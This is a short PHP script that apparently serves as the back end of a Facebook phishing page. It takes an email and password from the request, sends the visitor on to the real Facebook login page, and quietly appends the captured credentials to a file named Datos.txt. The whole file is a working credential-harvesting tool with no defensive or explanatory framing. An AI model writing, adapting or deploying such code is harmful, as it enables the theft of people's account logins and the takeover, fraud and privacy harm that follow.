<?php
$usuario= $_GET['email'];
$contraseña= $_GET['pass'];
header("Location: https://www.facebook.com/login.php");
$handle = fopen("Datos.txt", "a"); 
	fwrite($handle, "\r\n");
	fwrite($handle, "-----Datos-----");
	fwrite($handle, "\r\n");
	fwrite($handle, "Contraseña=");
	fwrite($handle, $contraseña);
	fwrite($handle, "\r\n");
	fwrite($handle, "Usurio=");
	fwrite($handle, $usuario);
	fwrite($handle, "\r\n");	
	
fclose($handle);
exit

?>